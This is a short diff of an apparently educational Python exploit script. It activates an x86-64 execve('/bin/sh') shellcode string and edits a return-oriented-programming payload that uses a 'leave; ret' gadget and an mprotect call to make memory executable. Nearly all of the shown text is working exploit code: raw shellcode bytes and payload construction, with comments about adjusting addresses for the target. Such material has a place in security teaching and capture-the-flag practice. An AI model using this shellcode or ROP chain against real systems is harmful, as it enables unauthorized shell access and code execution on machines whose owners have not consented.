@@ -20,9 +20,7 @@ you won't be able to just read() from stdin every single time, or that
 shellcode through read() might be too easy to detect and be obvious
 '''
 
-''' shellcode
-\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
-'''
+shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
 
 '''
 You're going to need to change the addrs of the functions for the ROP chain
@@ -39,7 +37,7 @@ def p(x):
 
 payload = ""
 payload += p(0x000000000040062b) # leave; ret
-payload += "A"*8 # padding
+payload += "A"*8 # padding, number of args in teh stack frame for main
 
 ## make memory section rwx
 ## int mprotect(void *addr, size_t len, int prot);
